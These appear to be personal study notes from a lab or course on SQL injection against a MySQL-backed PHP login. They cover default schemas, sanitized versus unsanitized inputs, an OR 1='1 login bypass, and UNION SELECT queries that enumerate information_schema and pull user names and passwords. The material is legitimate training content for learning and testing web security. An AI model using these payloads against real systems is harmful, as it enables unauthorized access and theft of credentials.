	default databases
		informational_schema
			provides information about the sql server
		performance_schema
			metrics of how the sql databse is running
		mysql
	

	table_schema = Databases
	table_name = Tables
	column_name = Columns



Unsanitized vs Sanitized Fields
	Unsanitized: input fields can be found using a Single Quote ⇒ '
		Will return extraneous information
		' closes a variable, to allow for additional statements/clauses
		May show no errors or generic error (harder Injection)
	Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
	Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')



To USE SQL INJECTION
	place in user field		tom' OR 1='1
	place in password field		tom' OR 1='1
	go To developer tool
	Change to Raw
	input raw after the .php and a ?	http://10.50.28.178/login.php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271




To Look at databases you don't have direct access towards
	Look at normal
		try all of the things they have
		try 					normal' OR 1='1
		use UNION and select columns		Audi' Union SELECT 1,2,3,4,5 #
		if it doesn't work keep going higher	
		Looking for databases								****** Audi' Union SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #	******

		Dive into Whatever we wanted		Audi' Union SELECT name,2,cost,type,color FROM session.car #
			Be mindful of how many columns worked
			Must be the exact amount
							Audi' Union SELECT id,name,pass,3,4 FROM session.user #
